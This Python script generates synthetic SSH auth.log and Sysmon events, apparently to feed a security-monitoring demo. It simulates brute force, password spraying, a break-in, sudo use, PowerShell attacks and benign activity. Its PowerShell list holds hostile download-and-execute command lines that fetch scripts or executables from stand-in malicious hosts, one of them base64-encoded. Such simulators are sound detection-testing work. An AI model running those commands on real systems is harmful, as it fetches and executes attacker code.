import os
import time
import json
import random
from datetime import datetime

LOG_DIR = "sample_logs"
AUTH_LOG_PATH = os.path.join(LOG_DIR, "auth.log")
SYSMON_LOG_PATH = os.path.join(LOG_DIR, "sysmon.json")

# Ensure sample log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# ─────────────────────────────────────────────────────────────────────────────
# Realistic attack vocabulary — varied IPs, accounts, hosts and event types so
# the feed looks like a real environment, not a broken record.
# ─────────────────────────────────────────────────────────────────────────────
ATTACKER_IPS = [
    "185.220.101.5", "45.147.229.11", "194.26.29.156", "91.240.118.172",
    "61.177.173.35", "218.92.0.204", "45.9.148.114", "103.149.27.62",
]
TRUSTED_IPS = ["10.0.0.5", "192.168.1.20", "172.16.4.11"]
TARGET_USERS = ["root", "admin", "ubuntu", "postgres", "deploy", "jenkins", "testuser", "guest"]
FAKE_USERS = ["oracle", "ftpuser", "admin1", "test", "pi", "user"]
PRIV_USERS = ["deploy", "ubuntu", "admin", "svc_backup"]
COMPUTERS = ["DESKTOP-SOC-01", "SERVER-PROD-02", "WORKSTATION-HR", "DC-CORP-01", "LAPTOP-CEO"]
WINDOWS_USERS = ["NT AUTHORITY\\SYSTEM", "CORP\\admin_user", "DESKTOP\\local_admin", "CORP\\hr_user"]

POWERSHELL_PAYLOADS = [
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c Get-Process | Where-Object {$_.CPU -gt 100}",
    "C:\\Windows\\System32\\cmd.exe /c powershell.exe -c Invoke-WebRequest -Uri http://malicious-domain.com/payload.exe -OutFile C:\\Users\\Public\\payload.exe",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.top/stage2.ps1')",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Get-WmiObject Win32_Process | Select-Object CommandLine",
]

BENIGN_WINDOWS = [
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer"),
    ("C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\hr\\notes.txt"),
    ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs"),
]

SUDO_COMMANDS = [
    "/bin/bash", "/usr/bin/apt update", "/usr/bin/systemctl restart nginx",
    "/usr/bin/tail /var/log/auth.log",
]


# ─────────────────────────────────────────────────────────────────────────────
# Writers
# ─────────────────────────────────────────────────────────────────────────────
def _ts():
    return datetime.now().strftime("%b %d %H:%M:%S")


def _utc():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.000")


def write_auth(lines):
    with open(AUTH_LOG_PATH, "a") as f:
        for line in lines:
            f.write(line + "\n")


def write_sysmon(events):
    with open(SYSMON_LOG_PATH, "a") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")


def _sysmon_event(image, command_line, computer=None, user=None):
    return {
        "UtcTime": _utc(),
        "Computer": computer or random.choice(COMPUTERS),
        "User": user or random.choice(WINDOWS_USERS),
        "Image": image,
        "ProcessId": str(random.randint(2000, 8000)),
        "CommandLine": command_line,
    }


# ─────────────────────────────────────────────────────────────────────────────
# Attack scenarios (each writes a realistic little story)
# ─────────────────────────────────────────────────────────────────────────────
def scenario_ssh_bruteforce():
    """A burst of failed logins against real accounts from one attacker IP."""
    ip = random.choice(ATTACKER_IPS)
    user = random.choice(TARGET_USERS)
    count = random.randint(3, 6)
    print(f"[+] 🎯 SSH brute-force: {count} failed logins for '{user}' from {ip}")
    lines = []
    for _ in range(count):
        lines.append(
            f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: "
            f"Failed password for {user} from {ip} port {random.randint(30000, 65000)} ssh2"
        )
    write_auth(lines)


def scenario_ssh_spray():
    """Password spray: fake usernames from one attacker IP."""
    ip = random.choice(ATTACKER_IPS)
    fake = random.choice(FAKE_USERS)
    print(f"[+] 🕵️ Password spray: fake username '{fake}' from {ip}")
    lines = [
        f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: Invalid user {fake} from {ip}",
        f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: "
        f"Failed password for invalid user {fake} from {ip} port {random.randint(30000, 65000)} ssh2",
    ]
    write_auth(lines)


def scenario_compromise():
    """The story judges love: repeated failures, then the attacker gets in."""
    ip = random.choice(ATTACKER_IPS)
    user = random.choice(TARGET_USERS)
    attempts = random.randint(3, 5)
    print(f"[+] 💥 Break-in story: {attempts} failures then SUCCESSFUL login for '{user}' from {ip}")
    lines = []
    for _ in range(attempts):
        lines.append(
            f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: "
            f"Failed password for {user} from {ip} port {random.randint(30000, 65000)} ssh2"
        )
    lines.append(
        f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: "
        f"Accepted password for {user} from {ip} port {random.randint(30000, 65000)} ssh2"
    )
    write_auth(lines)


def scenario_pam_failure():
    """pam_unix authentication failures (different log shape)."""
    ip = random.choice(ATTACKER_IPS)
    user = random.choice(TARGET_USERS)
    print(f"[+] 🔐 pam authentication failure for '{user}' from {ip}")
    write_auth([
        f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: pam_unix(sshd:auth): "
        f"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}"
    ])


def scenario_sudo_escalation():
    """A user runs something with admin rights."""
    user = random.choice(PRIV_USERS)
    cmd = random.choice(SUDO_COMMANDS)
    print(f"[+] 🔑 Privilege escalation: '{user}' ran sudo {cmd}")
    write_auth([
        f"{_ts()} soc-server sudo:     {user} : TTY=pts/{random.randint(0, 9)} ; "
        f"PWD=/home/{user} ; USER=root ; COMMAND={cmd}"
    ])


def scenario_powershell_attack():
    """Suspicious PowerShell on a Windows machine."""
    payload = random.choice(POWERSHELL_PAYLOADS)
    computer = random.choice(COMPUTERS)
    print(f"[+] ⚠️ Suspicious PowerShell on {computer}")
    write_sysmon([_sysmon_event(image=payload, command_line=payload, computer=computer)])


def scenario_benign_noise():
    """Normal activity — so the AI also gets to say 'this is fine'."""
    if random.random() < 0.5:
        user = random.choice(TARGET_USERS)
        ip = random.choice(TRUSTED_IPS)
        print(f"[+] 😌 Normal login: '{user}' from trusted {ip}")
        write_auth([
            f"{_ts()} soc-server sshd[{random.randint(1000, 9999)}]: "
            f"Accepted password for {user} from {ip} port {random.randint(30000, 65000)} ssh2"
        ])
    else:
        image, cmdline = random.choice(BENIGN_WINDOWS)
        print(f"[+] 😌 Normal Windows activity: {image}")
        write_sysmon([_sysmon_event(image=image, command_line=cmdline)])


SCENARIOS = [
    (scenario_ssh_bruteforce, 25),
    (scenario_ssh_spray, 15),
    (scenario_compromise, 15),
    (scenario_pam_failure, 10),
    (scenario_sudo_escalation, 10),
    (scenario_powershell_attack, 15),
    (scenario_benign_noise, 10),
]


def run_simulation_loop(interval_seconds=20):
    """Continuously injects realistic attack + normal activity into sample_logs/.

    Pacing is deliberately calm and believable: 1-2 scenario bursts every
    ~20 seconds, with varied IPs, accounts, hosts and event families.
    """
    print("==================================================")
    print("🚀 Attack Log Simulator v2 (realistic scenarios)")
    print(f"Target Directory  : {LOG_DIR}/")
    print(f"Scenario interval : every ~{interval_seconds}s")
    print("Scenarios         : brute-force, password spray, break-in story,")
    print("                    pam failures, sudo escalation, PowerShell,")
    print("                    plus normal activity for contrast")
    print("Press Ctrl+C to stop simulation")
    print("==================================================\n")

    try:
        while True:
            for _ in range(random.choices([1, 2], weights=[70, 30])[0]):
                scenario, _weight = random.choices(SCENARIOS, weights=[w for _, w in SCENARIOS])[0]
                scenario()

            print(f"Waiting {interval_seconds}s before next scenario...\n")
            time.sleep(interval_seconds)

    except KeyboardInterrupt:
        print("\n[!] Simulation stopped by user.")


if __name__ == "__main__":
    run_simulation_loop(interval_seconds=20)
